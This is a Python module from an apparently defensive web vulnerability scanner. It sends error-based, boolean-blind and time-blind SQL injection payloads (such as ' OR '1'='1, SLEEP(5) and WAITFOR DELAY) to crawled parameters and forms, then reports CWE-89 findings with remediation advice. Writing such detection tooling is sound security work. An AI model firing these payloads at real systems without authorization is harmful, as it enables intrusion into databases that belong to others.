"""
Module 2 — SQL Injection (SQLi) Agent

Runs real requests for three independent detection techniques against
every discovered parameter, so a WAF or app that blocks one style doesn't
hide the other two:

  1. Error-based   — a single quote / syntax breaker triggers a raw DB
                      error message that leaks the backend engine.
  2. Boolean-blind  — a TRUE clause and a FALSE clause are sent and the
                      *real* response bodies are diffed for a content
                      shape that flips consistently with TRUE/FALSE logic.
  3. Time-blind     — a conditional per-engine sleep payload; if the
                      response is measurably delayed vs. a same-shape
                      baseline request, the DB executed our injected clause.
"""
from __future__ import annotations

import re
import time

from .http_client import request, build_evidence, similarity

DB_ERROR_SIGNATURES = [
    ("MySQL", re.compile(r"SQL syntax.*MySQL|Warning.*mysqli?_|MySQLSyntaxErrorException", re.I)),
    ("PostgreSQL", re.compile(r"PostgreSQL.*ERROR|pg_query\(\)|org\.postgresql\.util\.PSQLException", re.I)),
    ("MSSQL", re.compile(r"Microsoft SQL Server|Unclosed quotation mark|System\.Data\.SqlClient", re.I)),
    ("Oracle", re.compile(r"ORA-\d{5}|Oracle error", re.I)),
    ("SQLite", re.compile(r"SQLite3?::|sqlite3\.OperationalError|near \".*\": syntax error", re.I)),
    ("Generic", re.compile(r"SQL syntax|SQLSTATE\[|SQL command not properly ended|quoted string not properly terminated", re.I)),
]

ERROR_PAYLOADS = ["'", "\"", "')", "\")", "';--", "' OR '1'='1"]

BOOLEAN_TRUE = "' OR '1'='1"
BOOLEAN_FALSE = "' OR '1'='2"

TIME_PAYLOADS = [
    ("MySQL/MariaDB", "' OR SLEEP(5)-- -"),
    ("PostgreSQL", "' OR pg_sleep(5)-- -"),
    ("MSSQL", "'; WAITFOR DELAY '0:0:5'--"),
    ("Oracle", "' OR DBMS_LOCK.SLEEP(5)-- -"),
]

TIME_THRESHOLD = 4.0  # seconds slower than baseline => strong signal


def _send(session, url, method, params, target_param, payload, others):
    data = {**{p: "1" for p in others}, target_param: payload}
    if method == "GET":
        return request(session, "GET", url, params=data)
    return request(session, "POST", url, data=data)


def _detect_error_based(session, url, method, param, others):
    for payload in ERROR_PAYLOADS:
        resp = _send(session, url, method, None, param, payload, others)
        if not resp.get("ok"):
            continue
        body = resp.get("body", "")
        for engine, pattern in DB_ERROR_SIGNATURES:
            if pattern.search(body):
                return {
                    "rule_id": "SQLI-ERROR-BASED",
                    "title": f"Error-based SQL Injection ({engine})",
                    "cwe": "CWE-89",
                    "severity": "critical",
                    "param": param,
                    "method": method,
                    "url": url,
                    "description": (
                        f"Injecting `{payload}` into '{param}' on {method} {url} caused the backend "
                        f"to leak a raw {engine} error message, confirming the input reaches a SQL "
                        "query without safe parameterization."
                    ),
                    "recommendation": "Use parameterized queries / prepared statements exclusively; "
                                       "never build SQL via string concatenation. Disable verbose DB errors in responses.",
                    "evidence": build_evidence(f"{method} {url} ?{param}={payload!r}", resp,
                                                note=f"Detected {engine} error signature in response body."),
                }
    return None


def _detect_boolean_blind(session, url, method, param, others):
    true_resp = _send(session, url, method, None, param, BOOLEAN_TRUE, others)
    false_resp = _send(session, url, method, None, param, BOOLEAN_FALSE, others)
    if not (true_resp.get("ok") and false_resp.get("ok")):
        return None
    if true_resp["status_code"] != false_resp["status_code"]:
        status_diff = True
    else:
        status_diff = False
    body_sim = similarity(true_resp.get("body", ""), false_resp.get("body", ""))
    # TRUE and FALSE payloads producing meaningfully different pages/status
    # despite identical structure elsewhere is the classic blind-boolean tell.
    if status_diff or body_sim < 0.85:
        return {
            "rule_id": "SQLI-BOOLEAN-BLIND",
            "title": "Boolean-based Blind SQL Injection",
            "cwe": "CWE-89",
            "severity": "critical",
            "param": param,
            "method": method,
            "url": url,
            "description": (
                f"Parameter '{param}' on {method} {url} returns a different response for a "
                f"tautology (`{BOOLEAN_TRUE}`) vs. a contradiction (`{BOOLEAN_FALSE}`), indicating "
                "the value is concatenated into a SQL WHERE clause the app then branches on."
            ),
            "recommendation": "Use parameterized queries; validate/whitelist input types (e.g. cast IDs to int) before use in a query.",
            "evidence": build_evidence(
                f"{method} {url} ?{param}=<TRUE vs FALSE>", true_resp,
                note=f"TRUE status={true_resp['status_code']} vs FALSE status={false_resp['status_code']}, body similarity={body_sim:.2f}"
            ),
        }
    return None


def _detect_time_blind(session, url, method, param, others):
    baseline = _send(session, url, method, None, param, "1", others)
    if not baseline.get("ok"):
        return None
    baseline_t = baseline.get("elapsed", 0)
    for engine, payload in TIME_PAYLOADS:
        resp = _send(session, url, method, None, param, payload, others)
        if not resp.get("ok"):
            continue
        delta = resp.get("elapsed", 0) - baseline_t
        if delta >= TIME_THRESHOLD:
            return {
                "rule_id": "SQLI-TIME-BLIND",
                "title": f"Time-based Blind SQL Injection ({engine})",
                "cwe": "CWE-89",
                "severity": "critical",
                "param": param,
                "method": method,
                "url": url,
                "description": (
                    f"Injecting a {engine} conditional sleep into '{param}' on {method} {url} "
                    f"delayed the response by {delta:.1f}s versus baseline ({baseline_t:.2f}s), "
                    "indicating the payload reached and executed inside a real SQL query."
                ),
                "recommendation": "Use parameterized queries; add query timeouts and WAF rules as defense in depth.",
                "evidence": build_evidence(f"{method} {url} ?{param}={payload!r}", resp,
                                            note=f"baseline={baseline_t:.2f}s, delayed={resp.get('elapsed'):.2f}s"),
            }
    return None


def run(session, target_report: dict, aggressive: bool = False) -> list:
    findings = []
    crawl = target_report.get("crawl", {})

    def test_points(points_iter):
        out = []
        for url, method, param, others in points_iter:
            f = _detect_error_based(session, url, method, param, others)
            if f:
                out.append(f)
                continue
            f = _detect_boolean_blind(session, url, method, param, others)
            if f:
                out.append(f)
                continue
            if aggressive:
                f = _detect_time_blind(session, url, method, param, others)
                if f:
                    out.append(f)
        return out

    def gen_points():
        for qp in crawl.get("query_points", []):
            for param in qp["params"]:
                others = [p for p in qp["params"] if p != param]
                yield qp["url"], "GET", param, others
        for form in crawl.get("forms", []):
            names = [i["name"] for i in form["inputs"] if i["type"] not in ("submit", "button", "file")]
            for name in names:
                others = [n for n in names if n != name]
                yield form["action"], form["method"], name, others

    findings.extend(test_points(gen_points()))
    return findings
